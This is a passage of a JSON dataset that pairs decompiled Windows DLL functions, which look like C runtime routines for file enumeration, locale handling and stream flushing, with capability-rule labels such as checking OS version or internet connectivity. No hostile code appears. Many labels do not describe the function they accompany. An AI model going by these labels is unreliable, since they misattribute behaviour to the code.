        "token_count": 454
    },
    "1800407e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpFindFileData\n// WARNING: Variable defined which should be unmapped: var_bp_28h\n// WARNING: Variable defined which should be unmapped: var_bp_30h\n\nvoid fcn.1800407e8(char *arg1, char *arg2, int64_t *arg3)\n\n{\n    uint8_t uVar1;\n    char *lpMem;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    char *arg1_00;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint8_t uVar7;\n    ulong uVar8;\n    uint64_t arg3_00;\n    ulong var_ch;\n    ulong var_230h;\n    uchar auStack888 [32];\n    ulong uStack856;\n    uint uStack848;\n    uchar auStack840 [8];\n    uint64_t uStack832;\n    ulong uStack824;\n    ulong uStack816;\n    ulong uStack808;\n    ulong uStack800;\n    ulong uStack792;\n    char cStack784;\n    int64_t iStack776;\n    int64_t iStack768;\n    char cStack752;\n    int64_t iStack744;\n    int64_t iStack736;\n    char cStack720;\n    ulong uStack712;\n    ulong uStack704;\n    char *pcStack696;\n    ulong uStack688;\n    ulong uStack680;\n    char cStack672;\n    uchar auStack620 [492];\n    ulong var_bp_78h;\n    ulong var_bp_70h;\n    ulong var_bp_68h;\n    ulong var_bp_58h;\n    ulong var_bp_50h;\n    ulong var_bp_48h;\n    uint64_t var_bp_40h;\n    ulong var_bp_38h;\n    ulong var_bp_30h;\n    ulong var_bp_28h;\n    ulong lpFindFileData;\n    \n    var_bp_40h = *0x180071010 ^ auStack888;\n    if (arg2 != arg1) {\n        do {\n            if ((*arg2 - 0x2fU < 0x2e) && ((0x200000000801U >> (*arg2 - 0x2fU & 0x3fU) & 1) != 0)) break;\n            arg2 = fcn.18004ed28(arg1, arg2);\n        } while (arg2 != arg1);\n    }\n    if ((*arg2 == ':') && (arg2 != arg1 + 1)) {\n        fcn.1800404d4(arg1, 0, 0, arg3);\n    }\n    else {\n        uVar7 = *arg2 - 0x2f;\n        uVar8 = 0;\n        if ((0x2d < uVar7) || (uVar1 = 1,  (0x200000000801U >> (uVar7 & 0x3fU) & 1) == 0)) {\n            uVar1 = 0;\n        }\n        uStack824 = 0;\n        uStack816 = 0;\n        uStack808 = 0;\n        uStack800 = 0;\n        uStack792 = 0;\n        arg3_00 = -uVar1 & arg2 + (1 - arg1);\n        cStack784 = '\\0';\n        uStack832 = arg3_00;\n        fcn.18003c0f8(&iStack776, 0);\n        if (*(iStack768 + 0xc) == 0xfde9) {\n            if (cStack752 != '\\0') {\n                *(iStack776 + 0x3a8) = *(iStack776 + 0x3a8) & 0xfffffffd;\n            }\n            uVar4 = 0xfde9;\n        }\n        else {\n            iVar2 = fcn.1800449d0();\n            if (iVar2 == 0) {\n                if (cStack752 != '\\0') {\n                    *(iStack776 + 0x3a8) = *(iStack776 + 0x3a8) & 0xfffffffd;\n                }\n                uVar4 = 1;\n            }\n            else {\n                uVar4 = uVar8;\n                if (cStack752 != '\\0') {\n                    *(iStack776 + 0x3a8) = *(iStack776 + 0x3a8) & 0xfffffffd;\n                }\n            }\n        }\n        iVar2 = fcn.18003fb78(arg1, &uStack824, auStack840, uVar4);\n        uStack848 = 0;\n        uStack856 = 0;\n        uVar4 = uStack808;\n        if (iVar2 != 0) {\n            uVar4 = uVar8;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileExW)(uVar4);\n        if (iVar3 == -1) {\n            fcn.1800404d4(arg1, 0, 0, arg3);\n            if (cStack784 != '\\0') {\n                fcn.18003fb14(uStack808);\n            }\n        }\n        else {\n            iVar6 = arg3[1] - *arg3 >> 3;\n            do {\n                uVar8 = 0;\n                uStack712 = 0;\n                uStack704 = 0;\n                pcStack696 = NULL;\n                uStack688 = 0;\n                uStack680 = 0;\n                cStack672 = '\\0';\n                fcn.18003c0f8(&iStack744, 0);\n                if (*(iStack736 + 0xc) == 0xfde9) {\n                    if (cStack720 != '\\0') {\n                        *(iStack744 + 0x3a8) = *(iStack744 + 0x3a8) & 0xfffffffd;\n                    }\n                    uVar8 = 0xfde9;\n                }\n                else {\n                    iVar2 = fcn.1800449d0();\n                    if (iVar2 == 0) {\n                        if (cStack720 != '\\0') {\n                            *(iStack744 + 0x3a8) = *(iStack744 + 0x3a8) & 0xfffffffd;\n                        }\n                        uVar8 = 1;\n                    }\n                    else if (cStack720 != '\\0') {\n                        *(iStack744 + 0x3a8) = *(iStack744 + 0x3a8) & 0xfffffffd;\n                    }\n                }\n                iVar2 = fcn.18003fcf4(auStack620, &uStack712, auStack840, uVar8);\n                lpMem = pcStack696;\n                arg1_00 = pcStack696;\n                if (iVar2 != 0) {\n                    arg1_00 = NULL;\n                }\n                if ((*arg1_00 == '.') && ((arg1_00[1] == '\\0' || ((arg1_00[1] == '.' && (arg1_00[2] == '\\0')))))) {\n                    if (cStack672 != '\\0') {\n                        fcn.18003fb14(pcStack696);\n                    }\n                }\n                else {\n                    iVar2 = fcn.1800404d4(arg1_00, arg1, arg3_00, arg3);\n                    if (iVar2 != 0) {\n                        if (cStack672 != '\\0') {\n                            fcn.18003fb14(lpMem);\n                        }\n                        (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n                        if (cStack784 != '\\0') {\n                            fcn.18003fb14(uStack808);\n                        }\n                        goto code_r0x000180040b14;\n                    }\n                    arg3_00 = uStack832;\n                    if (cStack672 != '\\0') {\n                        fcn.18003fb14(lpMem);\n                        arg3_00 = uStack832;\n                    }\n                }\n                iVar2 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar3);\n            } while (iVar2 != 0);\n            iVar5 = arg3[1] - *arg3 >> 3;\n            if (iVar6 != iVar5) {\n                fcn.18004e2e0(*arg3 + iVar6 * 8, iVar5 - iVar6, 8, 0x18003fb64);\n            }\n            (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n            if (cStack784 != '\\0') {\n                fcn.18003fb14(uStack808);\n            }\n        }\n    }\ncode_r0x000180040b14:\n    fcn.180002200(var_bp_40h ^ auStack888);\n    return;\n}\n",
        "token_count": 1917
    },
    "1800416e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.1800416e0(int64_t *arg1, int64_t *arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t *piVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    ulong uStackX16;\n    int64_t iStackX24;\n    int64_t iStackX32;\n    ulong var_48h;\n    ulong var_50h;\n    ulong var_58h;\n    uchar auStack88 [16];\n    ulong uStack72;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    if (arg2 == NULL) {\n        puVar4 = fcn.18003c3e8();\n        *puVar4 = 0x16;\n        fcn.18003bf58();\n        uVar8 = 0x16;\n    }\n    else {\n        *arg2 = 0;\n        iVar5 = *arg1;\n        auStack88 = ZEXT816(0);\n        uStack72 = 0;\n        while (iVar5 != 0) {\n            uStackX16 = CONCAT53(uStackX16._3_5_, 0x3f2a);\n            iVar5 = fcn.18004e960(iVar5, &uStackX16);\n            if (iVar5 == 0) {\n                uVar2 = fcn.1800404d4(*arg1, 0, 0, auStack88);\n                uVar8 = uVar2;\n                if (uVar2 != 0) {\n                    piVar7 = auStack88._0_8_;\n                    if (auStack88._0_8_ != auStack88._8_8_) {\n                        do {\n                            fcn.18003fb14(*piVar7);\n                            piVar7 = piVar7 + 1;\n                        } while (piVar7 != auStack88._8_8_);\n                    }\n                    goto code_r0x000180040017;\n                }\n            }\n            else {\n                uVar2 = fcn.1800407e8(*arg1, iVar5, auStack88);\n                uVar8 = uVar2;\n                if (uVar2 != 0) {\n                    piVar7 = auStack88._0_8_;\n                    if (auStack88._0_8_ != auStack88._8_8_) {\n                        do {\n                            fcn.18003fb14(*piVar7);\n                            piVar7 = piVar7 + 1;\n                        } while (piVar7 != auStack88._8_8_);\n                    }\n                    goto code_r0x000180040017;\n                }\n            }\n            arg1 = arg1 + 1;\n            iVar5 = *arg1;\n        }\n        iVar5 = (auStack88._8_8_ - auStack88._0_8_ >> 3) + 1;\n        iStackX24 = 0;\n        for (piVar7 = auStack88._0_8_; piVar7 != auStack88._8_8_; piVar7 = piVar7 + 1) {\n            iVar6 = -1;\n            do {\n                iVar6 = iVar6 + 1;\n            } while (*(*piVar7 + iVar6) != '\\0');\n            iStackX24 = iStackX24 + 1 + iVar6;\n        }\n        iVar6 = fcn.180017028(iVar5, iStackX24);\n        if (iVar6 == 0) {\n            fcn.18003fb14(0);\n            for (piVar7 = auStack88._0_8_; piVar7 != auStack88._8_8_; piVar7 = piVar7 + 1) {\n                fcn.18003fb14(*piVar7);\n            }\n            uVar8 = 0xffffffff;\ncode_r0x000180040017:\n            fcn.18003fb14(auStack88._0_8_);\n        }\n        else {\n            iVar5 = iVar6 + iVar5 * 8;\n            iStackX32 = iVar5;\n            if (auStack88._0_8_ != auStack88._8_8_) {\n                uStackX16 = iVar6 - auStack88._0_8_;\n                piVar7 = auStack88._0_8_;\n                do {\n                    iVar9 = -1;\n                    do {\n                        iVar10 = iVar9;\n                        iVar9 = iVar10 + 1;\n                    } while (*(*piVar7 + iVar9) != '\\0');\n                    iVar10 = iVar10 + 2;\n                    iVar3 = fcn.18004e7d0(iVar5, (iStackX32 - iVar5) + iStackX24, *piVar7, iVar10);\n                    if (iVar3 != 0) {\n                        fcn.18003bfa8(0, 0, 0, 0, 0);\n                        pcVar1 = swi(3);\n                        uVar8 = (*pcVar1)();\n                        return uVar8;\n                    }\n                    *(uStackX16 + piVar7) = iVar5;\n                    iVar5 = iVar5 + iVar10;\n                    piVar7 = piVar7 + 1;\n                } while (piVar7 != auStack88._8_8_);\n            }\n            *arg2 = iVar6;\n            fcn.18003fb14(0);\n            for (piVar7 = auStack88._0_8_; piVar7 != auStack88._8_8_; piVar7 = piVar7 + 1) {\n                fcn.18003fb14(*piVar7);\n            }\n            fcn.18003fb14(auStack88._0_8_);\n            uVar8 = 0;\n        }\n    }\n    return uVar8;\n}\n",
        "token_count": 1367
    },
    "18004190": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180041908(ulong hModule, ulong arg2, uint64_t arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong arg4;\n    ulong var_190h;\n    uchar auStack680 [32];\n    uchar auStack648 [8];\n    int64_t iStack640;\n    int64_t iStack632;\n    char cStack616;\n    ulong uStack608;\n    uint64_t uStack600;\n    ulong uStack592;\n    uint64_t uStack584;\n    ulong uStack576;\n    uchar uStack568;\n    uchar auStack552 [416];\n    ulong lpFilename;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180071010 ^ auStack680;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(hModule, auStack552, 0x105);\n    if (iVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.18003c35c(uVar2);\n    }\n    else {\n        uStack576 = 0;\n        uStack568 = 0;\n        uStack608 = arg2;\n        uStack600 = arg3 & 0xffffffff;\n        uStack592 = arg2;\n        uStack584 = arg3 & 0xffffffff;\n        fcn.18003c0f8(&iStack640, 0);\n        arg4 = 0xfde9;\n        if (*(iStack632 + 0xc) == 0xfde9) {\n            if (cStack616 != '\\0') {\n                *(iStack640 + 0x3a8) = *(iStack640 + 0x3a8) & 0xfffffffd;\n            }\n        }\n        else {\n            iVar1 = fcn.1800449d0();\n            if (iVar1 == 0) {\n                if (cStack616 != '\\0') {\n                    *(iStack640 + 0x3a8) = *(iStack640 + 0x3a8) & 0xfffffffd;\n                }\n                arg4 = 1;\n            }\n            else {\n                if (cStack616 != '\\0') {\n                    *(iStack640 + 0x3a8) = *(iStack640 + 0x3a8) & 0xfffffffd;\n                }\n                arg4 = 0;\n            }\n        }\n        fcn.1800416f0(auStack552, &uStack608, auStack648, arg4);\n    }\n    fcn.180002200(uStack24 ^ auStack680);\n    return;\n}\n",
        "token_count": 576
    },
    "180041a2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180041a2c(ulong noname_0, uint32_t *arg2, int64_t **arg3, uint32_t *arg4)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    int64_t iVar9;\n    \n    fcn.18003f700(*arg2);\n    puVar6 = *(**arg3 + 0x88) + 0x18;\n    if (*0x1800729b0 == NULL) {\ncode_r0x000180041adf:\n        puVar6 = fcn.18003c3e8();\n        *puVar6 = 0x16;\n        fcn.18003bf58();\n    }\n    else {\n        if (puVar6 == NULL) {\n            fcn.180004940(*0x1800729b0, 0, 0x101);\n            goto code_r0x000180041adf;\n        }\n        iVar9 = 2;\n        puVar8 = *0x1800729b0;\n        do {\n            uVar3 = puVar6[1];\n            uVar4 = puVar6[2];\n            uVar5 = puVar6[3];\n            *puVar8 = *puVar6;\n            puVar8[1] = uVar3;\n            puVar8[2] = uVar4;\n            puVar8[3] = uVar5;\n            uVar3 = puVar6[5];\n            uVar4 = puVar6[6];\n            uVar5 = puVar6[7];\n            puVar8[4] = puVar6[4];\n            puVar8[5] = uVar3;\n            puVar8[6] = uVar4;\n            puVar8[7] = uVar5;\n            uVar3 = puVar6[9];\n            uVar4 = puVar6[10];\n            uVar5 = puVar6[0xb];\n            puVar8[8] = puVar6[8];\n            puVar8[9] = uVar3;\n            puVar8[10] = uVar4;\n            puVar8[0xb] = uVar5;\n            uVar3 = puVar6[0xd];\n            uVar4 = puVar6[0xe];\n            uVar5 = puVar6[0xf];\n            puVar8[0xc] = puVar6[0xc];\n            puVar8[0xd] = uVar3;\n            puVar8[0xe] = uVar4;\n            puVar8[0xf] = uVar5;\n            uVar3 = puVar6[0x11];\n            uVar4 = puVar6[0x12];\n            uVar5 = puVar6[0x13];\n            puVar8[0x10] = puVar6[0x10];\n            puVar8[0x11] = uVar3;\n            puVar8[0x12] = uVar4;\n            puVar8[0x13] = uVar5;\n            uVar3 = puVar6[0x15];\n            uVar4 = puVar6[0x16];\n            uVar5 = puVar6[0x17];\n            puVar8[0x14] = puVar6[0x14];\n            puVar8[0x15] = uVar3;\n            puVar8[0x16] = uVar4;\n            puVar8[0x17] = uVar5;\n            uVar3 = puVar6[0x19];\n            uVar4 = puVar6[0x1a];\n            uVar5 = puVar6[0x1b];\n            puVar8[0x18] = puVar6[0x18];\n            puVar8[0x19] = uVar3;\n            puVar8[0x1a] = uVar4;\n            puVar8[0x1b] = uVar5;\n            puVar7 = puVar8 + 0x20;\n            uVar3 = puVar6[0x1d];\n            uVar4 = puVar6[0x1e];\n            uVar5 = puVar6[0x1f];\n            puVar8[0x1c] = puVar6[0x1c];\n            puVar8[0x1d] = uVar3;\n            puVar8[0x1e] = uVar4;\n            puVar8[0x1f] = uVar5;\n            puVar6 = puVar6 + 0x20;\n            iVar9 = iVar9 + -1;\n            puVar8 = puVar7;\n        } while (iVar9 != 0);\n        *puVar7 = *puVar6;\n    }\n    iVar9 = 2;\n    puVar6 = *(**arg3 + 0x88) + 0x119;\n    if (*0x1800729b8 != NULL) {\n        puVar8 = *0x1800729b8;\n        if (puVar6 != NULL) {\n            do {\n                uVar3 = puVar6[1];\n                uVar4 = puVar6[2];\n                uVar5 = puVar6[3];\n                *puVar8 = *puVar6;\n                puVar8[1] = uVar3;\n                puVar8[2] = uVar4;\n                puVar8[3] = uVar5;\n                uVar3 = puVar6[5];\n                uVar4 = puVar6[6];\n                uVar5 = puVar6[7];\n                puVar8[4] = puVar6[4];\n                puVar8[5] = uVar3;\n                puVar8[6] = uVar4;\n                puVar8[7] = uVar5;\n                uVar3 = puVar6[9];\n                uVar4 = puVar6[10];\n                uVar5 = puVar6[0xb];\n                puVar8[8] = puVar6[8];\n                puVar8[9] = uVar3;\n                puVar8[10] = uVar4;\n                puVar8[0xb] = uVar5;\n                uVar3 = puVar6[0xd];\n                uVar4 = puVar6[0xe];\n                uVar5 = puVar6[0xf];\n                puVar8[0xc] = puVar6[0xc];\n                puVar8[0xd] = uVar3;\n                puVar8[0xe] = uVar4;\n                puVar8[0xf] = uVar5;\n                uVar3 = puVar6[0x11];\n                uVar4 = puVar6[0x12];\n                uVar5 = puVar6[0x13];\n                puVar8[0x10] = puVar6[0x10];\n                puVar8[0x11] = uVar3;\n                puVar8[0x12] = uVar4;\n                puVar8[0x13] = uVar5;\n                uVar3 = puVar6[0x15];\n                uVar4 = puVar6[0x16];\n                uVar5 = puVar6[0x17];\n                puVar8[0x14] = puVar6[0x14];\n                puVar8[0x15] = uVar3;\n                puVar8[0x16] = uVar4;\n                puVar8[0x17] = uVar5;\n                uVar3 = puVar6[0x19];\n                uVar4 = puVar6[0x1a];\n                uVar5 = puVar6[0x1b];\n                puVar8[0x18] = puVar6[0x18];\n                puVar8[0x19] = uVar3;\n                puVar8[0x1a] = uVar4;\n                puVar8[0x1b] = uVar5;\n                uVar3 = puVar6[0x1d];\n                uVar4 = puVar6[0x1e];\n                uVar5 = puVar6[0x1f];\n                puVar8[0x1c] = puVar6[0x1c];\n                puVar8[0x1d] = uVar3;\n                puVar8[0x1e] = uVar4;\n                puVar8[0x1f] = uVar5;\n                puVar6 = puVar6 + 0x20;\n                iVar9 = iVar9 + -1;\n                puVar8 = puVar8 + 0x20;\n            } while (iVar9 != 0);\n            goto code_r0x000180041b90;\n        }\n        fcn.180004940(*0x1800729b8, 0, 0x100);\n    }\n    puVar6 = fcn.18003c3e8();\n    *puVar6 = 0x16;\n    fcn.18003bf58();\ncode_r0x000180041b90:\n    piVar2 = **arg3[1];\n    LOCK();\n    iVar1 = *piVar2;\n    *piVar2 = *piVar2 + -1;\n    if ((iVar1 == 1) && (**arg3[1] != 0x180071200)) {\n        fcn.18003fb14(**arg3[1]);\n    }\n    **arg3[1] = *(**arg3 + 0x88);\n    LOCK();\n    **(**arg3 + 0x88) = **(**arg3 + 0x88) + 1;\n    fcn.18003f754(*arg4);\n    return;\n}\n",
        "token_count": 2176
    },
    "1800423b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * fcn.1800423bc(int32_t *arg1, int32_t **arg2)\n\n{\n    int32_t iVar1;\n    int32_t *lpMem;\n    \n    if (((arg1[0xea] & *0x1800718a4) == 0) || (*(arg1 + 0x24) == 0)) {\n        fcn.18003f700(5);\n        lpMem = *(arg1 + 0x22);\n        if (lpMem != *arg2) {\n            if (lpMem != NULL) {\n                LOCK();\n                iVar1 = *lpMem;\n                *lpMem = *lpMem + -1;\n                if ((iVar1 == 1) && (lpMem != 0x180071200)) {\n                    fcn.18003fb14(lpMem);\n                }\n            }\n            lpMem = *arg2;\n            *(arg1 + 0x22) = lpMem;\n            LOCK();\n            *lpMem = *lpMem + 1;\n        }\n        arg1 = 0x5;\n        fcn.18003f754(5);\n    }\n    else {\n        lpMem = *(arg1 + 0x22);\n    }\n    if (lpMem != NULL) {\n        return lpMem;\n    }\n    fcn.1800188ac();\n    return arg1;\n}\n",
        "token_count": 295
    },
    "18004653": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.18004653c(ulong noname_0, ulong *arg2, int64_t **arg3, ulong *arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    fcn.180046ec4(*arg2);\n    if ((**arg3 != 0) && (uVar1 = *(**arg3 + 0x14),  (uVar1 >> 0xd & 1) != 0)) {\n        if ((((uVar1 & 3) == 2) && ((uVar1 & 0xc0) != 0)) || ((uVar1 >> 0xb & 1) != 0)) {\n            if ((*arg3[2] != '\\0') || ((*(**arg3 + 0x14) >> 1 & 1) != 0)) {\n                iVar2 = fcn.180046b58(**arg3);\n                if (iVar2 == -1) {\n                    *arg3[3] = 0xffffffff;\n                }\n                else {\n                    *arg3[1] = *arg3[1] + 1;\n                }\n            }\n        }\n        else {\n            *arg3[1] = *arg3[1] + 1;\n        }\n    }\n    fcn.180046ed0(*arg4);\n    return;\n}\n",
        "token_count": 296
    },
    "1800465d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.1800465d8(ulong noname_0, uint32_t *arg2, int32_t **arg3, uint32_t *arg4)\n\n{\n    int64_t *piVar1;\n    uint32_t uVar2;\n    int64_t *piVar3;\n    uchar auStackX16 [16];\n    uint32_t *puStackX32;\n    int64_t iStack88;\n    int64_t iStack80;\n    int64_t iStack72;\n    int64_t *piStack64;\n    int64_t *piStack56;\n    int32_t *piStack48;\n    int32_t *piStack40;\n    int32_t *piStack32;\n    \n    puStackX32 = arg4;\n    fcn.18003f700(*arg2);\n    piVar1 = *0x180072ff8 + *0x180072ff0;\n    for (piVar3 = *0x180072ff8; piStack64 = piVar3,  piVar3 != piVar1; piVar3 = piVar3 + 1) {\n        iStack88 = *piVar3;\n        if ((iStack88 != 0) && (uVar2 = *(iStack88 + 0x14),  (uVar2 >> 0xd & 1) != 0)) {\n            if ((((uVar2 & 3) == 2) && ((uVar2 & 0xc0) != 0)) || ((uVar2 >> 0xb & 1) != 0)) {\n                piStack32 = arg3[2];\n                piStack40 = arg3[1];\n                piStack48 = *arg3;\n                piStack56 = &iStack88;\n                iStack80 = iStack88;\n                iStack72 = iStack88;\n                fcn.18004653c(auStackX16, &iStack72, &piStack56, &iStack80);\n            }\n            else {\n                **arg3 = **arg3 + 1;\n            }\n        }\n    }\n    fcn.18003f754(*arg4);\n    return;\n}\n",
        "token_count": 466
    },
    "180046ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.180046acc(ulong *arg1, ulong arg2)\n\n{\n    ulong arg2_00;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (((*(arg1 + 0x14) & 3) == 2) && ((*(arg1 + 0x14) & 0xc0) != 0)) {\n        uVar2 = *arg1 - *(arg1 + 1);\n        *(arg1 + 2) = 0;\n        arg2_00 = arg1[1];\n        *arg1 = arg2_00;\n        if (0 < uVar2) {\n            uVar1 = fcn.180049564(arg1);\n            uVar1 = fcn.180050b88(uVar1, arg2_00, uVar2, arg2);\n            if (uVar2 != uVar1) {\n                LOCK();\n                *(arg1 + 0x14) = *(arg1 + 0x14) | 0x10;\n                return 0xffffffff;\n            }\n            if ((*(arg1 + 0x14) >> 2 & 1) != 0) {\n                LOCK();\n                *(arg1 + 0x14) = *(arg1 + 0x14) & 0xfffffffd;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 300
    },
    "180046b5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.180046b58(int64_t arg1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_28h;\n    uint uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_bp_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_18h._0_1_ = *0x180072760 == 0;\n    var_30h._0_1_ = 0;\n    var_bp_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (var_18h) {\n        var_28h._0_4_ = *0x1800711e8;\n        var_28h._4_4_ = *0x1800711ec;\n        uStack40 = *0x1800711f0;\n        uStack36 = *0x1800711f4;\n    }\n    if (arg1 == 0) {\n        uVar1 = fcn.1800469a4(0);\n        goto code_r0x000180046bdc;\n    }\n    iVar2 = fcn.180046acc(arg1, &var_40h);\n    if (iVar2 == 0) {\n        if ((*(arg1 + 0x14) >> 0xb & 1) != 0) {\n            uVar3 = fcn.180049564(arg1);\n            iVar2 = fcn.180050088(uVar3);\n            if (iVar2 != 0) goto code_r0x000180046bb8;\n        }\n        uVar1 = 0;\n    }\n    else {\ncode_r0x000180046bb8:\n        uVar1 = 0xffffffff;\n    }\ncode_r0x000180046bdc:\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_bp_10h != '\\0') {\n        iVar4 = fcn.180014ed0(&var_40h);\n        *(iVar4 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar4 = fcn.180014ed0(&var_40h);\n        *(iVar4 + 0x24) = var_bp_10h._4_4_;\n    }\n    return uVar1;\n}\n",
        "token_count": 614
    },
    "1800492a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.1800492a8(uint16_t *arg1, uint8_t *arg2, uint64_t arg3, int64_t arg4)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    int32_t iVar3;\n    \n    if ((arg2 == NULL) || (arg3 == 0)) {\n        *0x180073018 = 0;\n    }\n    else {\n        if (*arg2 != 0) {\n            if (*(arg4 + 0x28) == '\\0') {\n                fcn.180015220(arg4);\n            }\n            piVar2 = *(arg4 + 0x18);\n            uVar1 = *(piVar2 + 0xc);\n            if (uVar1 != 0xfde9) {\n                if (piVar2[0x27] == 0) {\n                    if (arg1 != NULL) {\n                        *arg1 = *arg2;\n                    }\n                    return 1;\n                }\n                if (*(*piVar2 + *arg2 * 2) < 0) {\n                    if ((((1 < *(piVar2 + 1)) && (*(piVar2 + 1) <= arg3)) &&\n                        (iVar3 = fcn.180042da8(uVar1, 9),  iVar3 != 0)) ||\n                       ((*(*(arg4 + 0x18) + 8) <= arg3 && (arg2[1] != 0)))) {\n                        return *(*(arg4 + 0x18) + 8);\n                    }\n                }\n                else {\n                    iVar3 = fcn.180042da8(uVar1, 9);\n                    if (iVar3 != 0) {\n                        return 1;\n                    }\n                }\n                *(arg4 + 0x30) = 1;\n                *(arg4 + 0x2c) = 0x2a;\n                return -1;\n            }\n            iVar3 = fcn.180054c38(arg1);\n            if (iVar3 < 0) {\n                return -1;\n            }\n            return iVar3;\n        }\n        if (arg1 != NULL) {\n            *arg1 = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 488
    },
    "18004ed2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint8_t * fcn.18004ed28(uint8_t *arg1, uint8_t *arg2)\n\n{\n    uint *puVar1;\n    uint8_t *puVar2;\n    int64_t aiStack40 [2];\n    int64_t iStack24;\n    char cStack16;\n    \n    if ((arg1 == NULL) || (arg2 == NULL)) {\n        puVar1 = fcn.18003c3e8();\n        *puVar1 = 0x16;\n        fcn.18003bf58();\n    }\n    else if (arg1 < arg2) {\n        fcn.18003c0f8(aiStack40, 0);\n        puVar2 = arg2 + -1;\n        if (*(iStack24 + 8) != 0) {\n            do {\n                puVar2 = puVar2 + -1;\n                if (puVar2 < arg1) break;\n            } while ((*(*puVar2 + 0x19 + iStack24) & 4) != 0);\n            puVar2 = arg2 + (-1 - (arg2 - puVar2 & 1));\n        }\n        if (cStack16 == '\\0') {\n            return puVar2;\n        }\n        *(aiStack40[0] + 0x3a8) = *(aiStack40[0] + 0x3a8) & 0xfffffffd;\n        return puVar2;\n    }\n    return NULL;\n}\n",
        "token_count": 322
    },
    "180054c7": {
        "rules": [
